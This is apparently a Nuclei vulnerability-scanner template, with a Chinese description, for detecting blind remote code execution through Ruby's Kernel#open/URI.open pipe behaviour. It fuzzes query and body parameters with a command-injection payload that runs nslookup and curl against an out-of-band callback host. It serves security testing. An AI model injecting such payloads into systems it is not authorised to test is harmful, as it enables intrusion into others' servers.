id: cmdi-ruby-open-rce

info:
  name: Ruby Kernel#open/URI.open 远程代码执行（DAST）
  author: pdteam
  severity: high
  description: |
    该模板检测 Ruby Kernel#open/URI.open 被不可信输入滥用时的远程代码执行风险。Ruby open 在参数以管道符开头时可触发进程调用，例如 open("| command")。
  reference:
    - https://bishopfox.com/blog/ruby-vulnerabilities-exploits
    - https://codeql.github.com/codeql-query-help/ruby/rb-kernel-open/
  metadata:
    max-request: 1
  tags: cmdi,oast,dast,blind,ruby,rce,vuln

variables:
  marker: "{{interactsh-url}}"

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    stop-at-first-match: true
    payloads:
      interaction:
        - "|nslookup {{marker}}|curl {{marker}}"

    fuzzing:
      - parts:
          - query
          - body
        fuzz:
          - "{{interaction}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
